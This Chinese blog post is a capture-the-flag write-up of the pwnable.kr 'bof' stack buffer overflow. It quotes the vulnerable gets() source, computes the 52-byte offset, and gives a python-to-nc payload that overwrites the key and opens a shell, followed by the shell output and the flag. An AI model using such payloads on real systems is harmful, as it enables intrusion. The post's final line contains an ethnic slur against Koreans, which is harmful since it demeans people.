---
id: 35
title: pwnable.kr-bof
date: 2016-07-08T16:39:12+00:00
author: admin
layout: post
guid: http://www.ikow.cn/?p=35
permalink: /pwnable-kr-bof/
categories:
  - pwn
tags:
  - exploit
  - payload
  - pwn
  - pwnable.kr
  - shellcode
---
首先还是题目描述：

> Nana told me that buffer overflow is one of the most common software vulnerability.
  
> Is that true?
> 
> Download : http://pwnable.kr/bin/bof
  
> Download : http://pwnable.kr/bin/bof.c
> 
> Running at : nc pwnable.kr 9000

给了c的源文件还有编译好的elf文件，c源码为：

<pre class="brush: cpp; title: ; notranslate" title="">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);    // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
</pre>

很明显，根据注释，在gets函数的地方进行栈溢出，将key的数值覆盖为0xcafebabe，那么接下来需要计算出key和overflowme的地址差。一开始看到提供的elf文件，我觉得没有用，因为给了c源码，完全可以自己编译。现在知道编译完成后，变量的地址已经相对固定了。我们用IDA打开elf文件，看到key的地址为[bp+8h]，overflowme的地址为[bp-2Ch]，两者相差了8h+2Ch=52，所以我们用52个字符填充就可以了，其后用cafebabe进行填充。最后的payload为：

> (python -c &#8220;print &#8216;a&#8217;*52 + &#8216;\xbe\xba\xfe\xca'&#8221;;cat -) | nc pwnable.kr 9000

直接获取了shell，然后读取flag文件：

> ls -al
  
> total 16512
  
> drwxr-x&#8212;  3 root bof      4096 Sep 10  2014 .
  
> dr-xr-xr-x 66 root root     4096 Jul  1 02:14 ..
  
> d&#8212;&#8212;&#8212;  2 root root     4096 Jun 12  2014 .bash_history
  
> -r-xr-x&#8212;  1 root bof      7348 Jun 11  2014 bof
  
> -rw-r&#8211;r&#8211;  1 root root      310 Jun 11  2014 bof.c
  
> -r&#8211;r&#8212;&#8211;  1 root bof        32 Jun 11  2014 flag
  
> -rw&#8212;&#8212;-  1 root bof  16869264 Jul  8 01:38 log
  
> -rwx&#8212;&#8212;  1 root bof       760 Sep 10  2014 super.pl
  
> cat flag
  
> daddy, I just pwned a buFFer 🙂

最后的flag为daddy, I just pwned a buFFer 🙂   （怎么感觉这个傻逼棒子总是在占我们的便宜）